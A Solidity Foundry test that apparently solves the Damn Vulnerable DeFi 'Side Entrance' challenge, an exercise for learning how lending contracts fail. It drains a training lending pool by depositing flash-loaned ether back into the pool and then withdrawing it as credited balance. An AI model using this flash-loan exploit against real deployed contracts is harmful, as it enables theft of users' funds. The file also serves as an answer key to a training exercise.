// SPDX-License-Identifier: MIT
pragma solidity =0.8.13;

import {IFlashLoanEtherReceiver} from "../src/damn-vulnerable-defi/contracts/side-entrance/SideEntranceLenderPool.sol";
import {SideEntranceLenderPool} from "../src/damn-vulnerable-defi/contracts/side-entrance/SideEntranceLenderPool.sol";
import "forge-std/Test.sol";

contract MaliciousContract is IFlashLoanEtherReceiver, Test {
    SideEntranceLenderPool pool;
    address alice = vm.addr(10);

    receive() external payable {}

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function setUp() public {
        pool = new SideEntranceLenderPool();
        (bool success, ) = address(pool).call{value: 1000 ether}("");
        require(success);
    }

    function testHack() public {
        assertEq(address(pool).balance, 1000 ether);
        uint256 currentBalance = address(this).balance;

        pool.flashLoan(1000 ether);
        pool.withdraw();

        uint256 afterBalance = address(this).balance;

        assertEq(address(pool).balance, 0);
        assertEq(afterBalance - currentBalance, 1000 ether);
    }
}